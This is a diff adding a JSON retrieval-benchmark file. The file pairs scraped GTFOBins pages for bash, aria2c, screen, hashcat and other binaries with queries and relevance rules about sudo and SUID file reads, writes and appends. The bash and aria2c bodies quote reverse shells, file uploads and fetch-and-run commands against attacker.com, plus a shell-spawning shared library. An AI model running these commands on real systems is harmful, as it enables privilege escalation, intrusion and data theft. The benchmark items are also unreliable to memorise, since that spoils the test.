@@ -1,0 +1,418 @@
+{
+  "documents": [
+    {
+      "chunk_id": "281-0",
+      "doc_id": 281,
+      "title": "bash | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/bash/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 10491,
+      "body": ".. / bash Shell Reverse shell File write File read Upload Download Library load Shell This executable can spawn an interactive system shell. Unprivileged This function can be performed by any unprivileged user. bash Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p Reverse shell This executable can send back a reverse system shell to a listening attacker. Unprivileged This function can be performed by any unprivileged user. bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1' Listener A TCP server can be used on the attacker box to receive the shell. nc -l -p 12345 File write This executable can write data to local files. Unprivileged This function can be performed by any unprivileged user. bash -c 'echo DATA >/path/to/output-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo DATA >/path/to/output-file' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo DATA >/path/to/output-file' Comment This only works interactively from an existing bash session. It adds timestamps to the output file. Unprivileged This function can be performed by any unprivileged user. HISTIGNORE='history *' history -c DATA history -w /path/to/output-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . HISTIGNORE='history *' history -c DATA history -w /path/to/output-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. HISTIGNORE='history *' history -c DATA history -w /path/to/output-file Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. bash -c 'echo \"$(</path/to/input-file)\"' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo \"$(</path/to/input-file)\"' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo \"$(</path/to/input-file)\"' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Comment This only works interactively from an existing bash session. Unprivileged This function can be performed by any unprivileged user. HISTTIMEFORMAT=$'\\r\\e[K' history -c history -r /path/to/input-file history Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . HISTTIMEFORMAT=$'\\r\\e[K' history -c history -r /path/to/input-file history SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. HISTTIMEFORMAT=$'\\r\\e[K' history -c history -r /path/to/input-file history Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Upload This executable can upload local data. Unprivileged This function can be performed by any unprivileged user. bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Receiver An HTTP server can be used on the attacker box to receive the data. nc -l -p 80 | awk 'BEGIN {RS=\"\\r\\n\\r\\n\";ORS=\"\"} NR==2' >/path/to/output-file Unprivileged This function can be performed by any unprivileged user. bash -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Receiver A TCP server can be used on the attacker box to receive the data. nc -l -p 12345 >/path/to/output-file Download This executable can download remote data. Unprivileged This function can be performed by any unprivileged user. bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\ 3<>/dev/tcp/attacker.com/12345 \\ | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\ 3<>/dev/tcp/attacker.com/12345 \\ | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\ 3<>/dev/tcp/attacker.com/12345 \\ | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Sender An HTTP server can be used on the attacker box to send the data. python -m http.server 80 Unprivileged This function can be performed by any unprivileged user. bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Sender A TCP server can be used on the attacker box to send the data. nc -l -p 12345 </path/to/input-file Library load This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Unprivileged This function can be performed by any unprivileged user. bash -c 'enable -f /path/to/lib.so x' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'enable -f /path/to/lib.so x' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'enable -f /path/to/lib.so x' Payload As an example, the following can be used to create a minimal shared library ( lib.so ) that spawns a shell upon loading: echo '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\ | gcc -w -fPIC -shared -o lib.so -x c - Add the usual -p argument to the shell for SUID contexts. Consider calling setuid(0); beforehand if the executable has the CAP_SETUID capability assigned.",
+      "requests": [
+        {
+          "decision_id": "471ac40d91cc179e7be7-0",
+          "query": "GTFOBins setuid append a line to an existing log",
+          "information_need": "Append selected text to an existing local log under SUID.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "ce4c4bc25e5157435f58-0",
+          "query": "GTFOBins setuid read contents from a local file",
+          "information_need": "Find a documented SUID local file read.",
+          "rule": "Retrieves substantive contents from a selected file under SUID, in the file-read example itself."
+        },
+        {
+          "decision_id": "ee8b44604c7b5f3f2065-0",
+          "query": "GTFOBins write to a file keeping existing contents with sudo",
+          "information_need": "Add to a local file and preserve previous contents under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        }
+      ]
+    },
+    {
+      "chunk_id": "150-0",
+      "doc_id": 150,
+      "title": "aria2c | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/aria2c/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 4308,
+      "body": ".. / aria2c Command File read Download Command This executable can run non-interactive system commands. Comment Note that the subprocess is immediately sent to the background. Unprivileged This function can be performed by any unprivileged user. echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain Comment The remote file aaaaaaaaaaaaaaaa (must be a string of 16 hex digit) contains the shell script, e.g., /path/to/command . Note that said file needs to be written on disk in order to be executed. --allow-overwrite is needed if this is executed multiple times with the same GID. Unprivileged This function can be performed by any unprivileged user. aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa File read This executable can read data from local files. Comment The file is leaked as error messages. Unprivileged This function can be performed by any unprivileged user. aria2c -i /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c -i /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. aria2c -i /path/to/input-file Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Download This executable can download remote data. Comment Use --allow-overwrite if needed. Similarly -o /path/to/ouput-file can be omitted, in that case the file is saved to input-file in the current working directory. Unprivileged This function can be performed by any unprivileged user. aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "11b3a56517f3575b62a0-0",
+          "query": "GTFOBins sudo overwrite a local file",
+          "information_need": "Find an example that can replace existing local file contents under sudo.",
+          "rule": "Requires an actual write replacing content under sudo. Append-only, deletion and mere truncation do not qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "501-0",
+      "doc_id": 501,
+      "title": "comm | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/comm/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 851,
+      "body": ".. / comm File read File read This executable can read data from local files. Comment A newline is appended to the file. Unprivileged This function can be performed by any unprivileged user. comm /path/to/input-file /dev/null Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . comm /path/to/input-file /dev/null SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. comm /path/to/input-file /dev/null Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.",
+      "requests": [
+        {
+          "decision_id": "15aecf9afabef5f9f15f-0",
+          "query": "GTFOBins sudo append to an existing file",
+          "information_need": "Find local file append with sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "2c83add72e7df1895702-0",
+          "query": "GTFOBins append data to a file with sudo",
+          "information_need": "Find sudo examples that append to an existing local file without replacing its old content.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient. Must show append behavior, not just overwriting."
+        },
+        {
+          "decision_id": "303ad6de2aaa0f5b82c1-0",
+          "query": "GTFOBins sudo append lines to a log",
+          "information_need": "Append chosen text lines to a local log under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "85462a1e23b5ab3c8d9a-0",
+          "query": "GTFOBins file append under SUID",
+          "information_need": "Append chosen text to a local file in the documented SUID context.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "c6381c87d091d91e376b-0",
+          "query": "GTFOBins setuid append a line to an existing log",
+          "information_need": "Append selected text to an existing local log under SUID.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "d0824172f525e697f016-0",
+          "query": "GTFOBins append file contents as an unprivileged user",
+          "information_need": "Append chosen text to a local file as an unprivileged user.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "d2333a5fae7b04722f3d-0",
+          "query": "GTFOBins alternatives for appending text to a file with sudo",
+          "information_need": "Find other sources for appending local text under sudo.",
+          "rule": "Only non-GTFOBins documents with substantive append-to-file and sudo evidence qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "981-0",
+      "doc_id": 981,
+      "title": "screen | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/screen/",
+      "description": "Living off the land using \"screen\".",
+      "body_start": 0,
+      "body_end": 1773,
+      "body": ".. / screen Shell File write Shell This executable can spawn an interactive system shell. Unprivileged This function can be performed by any unprivileged user. screen Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . screen File write This executable can write data to local files. Version requirements 4.06.02 Comment Data is appended to the file and \\n is converted to \\r\\n . Unprivileged This function can be performed by any unprivileged user. screen -L -Logfile /path/to/output-file echo DATA Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . screen -L -Logfile /path/to/output-file echo DATA Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Version requirements 4.05.00 Comment Data is appended to the file and \\n is converted to \\r\\n . Unprivileged This function can be performed by any unprivileged user. screen -L /path/to/output-file echo DATA Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . screen -L /path/to/output-file echo DATA Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.",
+      "requests": [
+        {
+          "decision_id": "14286f5f7d37dda4ee0e-0",
+          "query": "GTFOBins write to a file keeping existing contents with sudo",
+          "information_need": "Add to a local file and preserve previous contents under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "3641238bda7371ae25f9-0",
+          "query": "GTFOBins setuid append a line to an existing log",
+          "information_need": "Append selected text to an existing local log under SUID.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "51dc611ef637344a44df-0",
+          "query": "GTFOBins append file contents as an unprivileged user",
+          "information_need": "Append chosen text to a local file as an unprivileged user.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "76cdc61940e66c7e41f5-0",
+          "query": "GTFOBins add text to the end of a local file via sudo",
+          "information_need": "Add selected text to the end of a local file under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "858b3a66b8e0fbd01f43-0",
+          "query": "GTFOBins add new data to the end of an existing file",
+          "information_need": "Find an append capability for a local file with no particular privilege condition.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "8d5ad5de0d55b9a21d92-0",
+          "query": "GTFOBins alternatives for appending text to a file with sudo",
+          "information_need": "Find other sources for appending local text under sudo.",
+          "rule": "Only non-GTFOBins documents with substantive append-to-file and sudo evidence qualify."
+        },
+        {
+          "decision_id": "8d9393a4a71490f0c1ad-0",
+          "query": "GTFOBins sudo append to an existing file",
+          "information_need": "Find local file append with sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "c1b73fe72a7bd0456012-0",
+          "query": "GTFOBins sudo append lines to a log",
+          "information_need": "Append chosen text lines to a local log under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "eaf4f30281533ffa7d29-0",
+          "query": "GTFOBins append data to a file with sudo",
+          "information_need": "Find sudo examples that append to an existing local file without replacing its old content.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient. Must show append behavior, not just overwriting."
+        }
+      ]
+    },
+    {
+      "chunk_id": "301-0",
+      "doc_id": 301,
+      "title": "bc | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/bc/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 733,
+      "body": ".. / bc File read File read This executable can read data from local files. Comment The file content is actually parsed and appears as error messages. Unprivileged This function can be performed by any unprivileged user. bc -s /path/to/input-file quit Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bc -s /path/to/input-file quit SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bc -s /path/to/input-file quit",
+      "requests": [
+        {
+          "decision_id": "1ff593c75eea46d34481-0",
+          "query": "GTFOBins setuid read contents from a local file",
+          "information_need": "Find a documented SUID local file read.",
+          "rule": "Retrieves substantive contents from a selected file under SUID, in the file-read example itself."
+        }
+      ]
+    },
+    {
+      "chunk_id": "69-0",
+      "doc_id": 69,
+      "title": "alpine | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/alpine/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 825,
+      "body": ".. / alpine File read File read This executable can read data from local files. Comment The file is displayed in the terminal interface. Other options might be available, for example, by pressing S is possible to save the file content elsewhere. Unprivileged This function can be performed by any unprivileged user. alpine -F /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . alpine -F /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. alpine -F /path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "94443d016b9ae50c260f-0",
+          "query": "GTFOBins setuid read contents from a local file",
+          "information_need": "Find a documented SUID local file read.",
+          "rule": "Retrieves substantive contents from a selected file under SUID, in the file-read example itself."
+        }
+      ]
+    },
+    {
+      "chunk_id": "470-0",
+      "doc_id": 470,
+      "title": "clamscan | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/clamscan/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 1235,
+      "body": ".. / clamscan File read File read This executable can read data from local files. Comment Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using sed . Unprivileged This function can be performed by any unprivileged user. touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.",
+      "requests": [
+        {
+          "decision_id": "18e539f6418c86c2f504-0",
+          "query": "GTFOBins setuid read contents from a local file",
+          "information_need": "Find a documented SUID local file read.",
+          "rule": "Retrieves substantive contents from a selected file under SUID, in the file-read example itself."
+        }
+      ]
+    },
+    {
+      "chunk_id": "980-0",
+      "doc_id": 980,
+      "title": "hashcat | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/hashcat/",
+      "description": "Living off the land using \"hashcat\".",
+      "body_start": 0,
+      "body_end": 922,
+      "body": ".. / hashcat File write File write This executable can write data to local files. Comment Append data to the end of the output file, creating if does not exist. Unprivileged This function can be performed by any unprivileged user. echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist",
+      "requests": [
+        {
+          "decision_id": "207d3fc37bbd79ec6cc1-0",
+          "query": "GTFOBins write to a file keeping existing contents with sudo",
+          "information_need": "Add to a local file and preserve previous contents under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "251d5b12e52cc765b9a0-0",
+          "query": "GTFOBins setuid append a line to an existing log",
+          "information_need": "Append selected text to an existing local log under SUID.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "3f84f423e66543f1abcc-0",
+          "query": "GTFOBins append data to a file with sudo",
+          "information_need": "Find sudo examples that append to an existing local file without replacing its old content.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient. Must show append behavior, not just overwriting."
+        },
+        {
+          "decision_id": "6250d948d5d50eb64c7f-0",
+          "query": "GTFOBins sudo append lines to a log",
+          "information_need": "Append chosen text lines to a local log under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "68ccf1a882419ee5bb70-0",
+          "query": "GTFOBins add new data to the end of an existing file",
+          "information_need": "Find an append capability for a local file with no particular privilege condition.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "84277022f122da5ff393-0",
+          "query": "GTFOBins add text to the end of a local file via sudo",
+          "information_need": "Add selected text to the end of a local file under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "9c72b6810717490c1dac-0",
+          "query": "GTFOBins sudo append to an existing file",
+          "information_need": "Find local file append with sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "cb50c4a3b84c3eae818a-0",
+          "query": "GTFOBins write data to a local path through sudo",
+          "information_need": "Find writing chosen content to a selected local file under sudo.",
+          "rule": "Requires substantive writing under sudo. Both append and overwrite qualify, but deletion and read-only examples do not."
+        },
+        {
+          "decision_id": "e6fe181dbf8da9ccc67d-0",
+          "query": "GTFOBins append file contents as an unprivileged user",
+          "information_need": "Append chosen text to a local file as an unprivileged user.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "eda04e31029fa7601414-0",
+          "query": "GTFOBins alternatives for appending text to a file with sudo",
+          "information_need": "Find other sources for appending local text under sudo.",
+          "rule": "Only non-GTFOBins documents with substantive append-to-file and sudo evidence qualify."
+        }
+      ]
+    },
+    {
+      "chunk_id": "260-0",
+      "doc_id": 260,
+      "title": "base58 | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/base58/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 491,
+      "body": ".. / base58 File read File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. base58 /path/to/input-file | base58 --decode Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . base58 /path/to/input-file | base58 --decode",
+      "requests": [
+        {
+          "decision_id": "ae678dd3ded24da5272f-0",
+          "query": "GTFOBins sudo overwrite a local file",
+          "information_need": "Find an example that can replace existing local file contents under sudo.",
+          "rule": "Requires an actual write replacing content under sudo. Append-only, deletion and mere truncation do not qualify."
